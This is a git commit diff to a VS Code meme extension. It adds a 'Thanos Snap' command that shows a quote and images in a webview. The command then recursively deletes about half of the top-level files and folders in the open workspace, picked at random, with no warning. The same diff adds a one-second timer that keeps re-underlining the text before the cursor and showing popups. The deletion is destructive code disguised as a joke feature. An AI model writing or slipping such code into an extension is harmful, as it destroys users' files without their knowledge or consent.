9074c19406bfca2ab4b9e1570016e1abc4c526a7
ABHINAV112 <nabhinav2000@gmail.com>
2021-01-09 07:22:11 +0800

    added bunch of stuff

--- extension.js
+++ extension.js
@@ -3,7 +3,13 @@
 
 const vscode = require("vscode");
 const axios = require("axios");
+const fs = require("fs");
+const path = require("path");
+const events = require("events");
+const eventEmitter = new events.EventEmitter();
+
 let scheduler;
+let hackySolution;
 const createMemeWebView = async function () {
   const panel = vscode.window.createWebviewPanel(
     "meme",
@@ -12,7 +18,7 @@ const createMemeWebView = async function () {
     {}
   );
 
-  var config = {
+  const config = {
     method: "get",
     url: "https://meme-api.herokuapp.com/gimme",
     headers: {},
@@ -34,16 +40,100 @@ const createMemeWebView = async function () {
 `;
 };
 
+const createSnapWebView = function (quote) {
+  const panel = vscode.window.createWebviewPanel(
+    "snap",
+    "Thanos Snap",
+    vscode.ViewColumn.One,
+    {}
+  );
+  let count = 0;
+  let timerInterval;
+  panel.webview.html = `<!DOCTYPE html>
+  <html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Thanos Snap</title>
+  </head><body></body>
+  </html>`;
+
+  timerInterval = setInterval(() => {
+    panel.webview.html = `
+  <!DOCTYPE html>
+  <html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Thanos Snap</title>
+  </head>
+      <h1>${quote}</h1>
+      ${
+        count >= 2
+          ? `<img src="https://media1.tenor.com/images/e36fb32cfc3b63075adf0f1843fdc43a/tenor.gif?itemid=12502580"></img>`
+          : ""
+      }
+      ${
+        count >= 1
+          ? `<img src="https://thumbs-prod.si-cdn.com/0Hlhw9KPW6kA8-zuSeBrgg0ztfQ=/fit-in/1600x0/filters:focal(582x120:583x121)/https://public-media.si-cdn.com/filer/d6/7d/d67d186f-f5f3-4867-82c5-2c772120304f/thanos-snap-featured-120518-2.jpg"></img>`
+          : ""
+      }
+  </body>
+  </html>`;
+    count += 1;
+    if (count >= 3) {
+      clearInterval(timerInterval);
+      const workspace = vscode.workspace;
+      const rootPath = workspace.rootPath;
+
+      fs.readdir(rootPath, async function (err, files) {
+        if (err) {
+          return console.log("Unable to scan directory: " + err);
+        }
+
+        await Promise.all(
+          files.map(async (file) => {
+            const randomProbability = Math.random();
+
+            if (randomProbability > 0.5) {
+              const filePath = path.join(rootPath, file);
+              const edit = new vscode.WorkspaceEdit();
+              const fileUri = vscode.Uri.file(filePath);
+              edit.deleteFile(fileUri, {
+                recursive: true,
+                ignoreIfNotExists: true,
+              });
+              return await workspace.applyEdit(edit);
+            }
+          })
+        );
+      });
+    }
+  }, 5000);
+
+  panel.onDidDispose(() => {
+    clearInterval(timerInterval);
+  });
+};
+
 function activate(context) {
   let activeEditor = vscode.window.activeTextEditor;
 
   const underlineDecoration = vscode.window.createTextEditorDecorationType({
     textDecoration: "darkred wavy underline",
   });
-  const noUnderlineDecoration = vscode.window.createTextEditorDecorationType({
-    textDecoration: "",
-  });
 
+  const lint = function () {
+    if (!activeEditor) {
+      return;
+    }
+    const selectedText = activeEditor.document.getText(activeEditor.selection);
+    const start = new vscode.Position(0, 0);
+    const range = new vscode.Range(start, activeEditor.selection.end);
+    activeEditor.setDecorations(underlineDecoration, [range]);
+
+    vscode.window.showInformationMessage(selectedText);
+  };
   vscode.window.onDidChangeActiveTextEditor(
     (editor) => {
       activeEditor = editor;
@@ -52,34 +142,7 @@ function activate(context) {
     context.subscriptions
   );
 
-  const lint = vscode.commands.registerCommand("lod.lint", function () {
-    if (!activeEditor) {
-      vscode.window.showErrorMessage("Editor not selected");
-      return;
-    }
-
-    const selectedText = activeEditor.document.getText(activeEditor.selection);
-    const range = new vscode.Range(
-      activeEditor.selection.start,
-      activeEditor.selection.end
-    );
-    activeEditor.setDecorations(underlineDecoration, [range]);
-
-    vscode.window.showInformationMessage(selectedText);
-  });
-
-  const unlint = vscode.commands.registerCommand("lod.unlint", function () {
-    if (!activeEditor) {
-      vscode.window.showErrorMessage("Editor not selected");
-      return;
-    }
-
-    const selectedText = activeEditor.document.getText(activeEditor.selection);
-
-    activeEditor.setDecorations(underlineDecoration, []);
-
-    vscode.window.showInformationMessage(selectedText);
-  });
+  const lintCommand = vscode.commands.registerCommand("lod.lint", lint);
 
   const MINUTES = 5;
   scheduler = setInterval(() => {
@@ -95,15 +158,42 @@ function activate(context) {
     createMemeWebView
   );
 
-  context.subscriptions.push(lint);
-  context.subscriptions.push(unlint);
+  hackySolution = setInterval(function () {
+    lint();
+  }, 1000);
+
+  const thanosMeme = async function () {
+    const thanosQuoteAPIUrl = "https://thanosapi.herokuapp.com/random/";
+    const config = {
+      method: "get",
+      url: thanosQuoteAPIUrl,
+      headers: {},
+    };
+    // @ts-ignore
+    const thanosQuote = (await axios(config)).data.quote;
+    // console.log(thanosQuote);
+
+    createSnapWebView(thanosQuote);
+
+    //
+  };
+  const thanosMemeCommand = vscode.commands.registerCommand(
+    "lod.thanosMeme",
+    thanosMeme
+  );
+
+  context.subscriptions.push(lintCommand);
   context.subscriptions.push(webview);
+  context.subscriptions.push(thanosMemeCommand);
 }
 // @ts-ignore
 exports.activate = activate;
 
 // this method is called when your extension is deactivated
-function deactivate() {}
+function deactivate() {
+  clearInterval(scheduler);
+  clearInterval(hackySolution);
+}
 
 module.exports = {
   // @ts-ignore
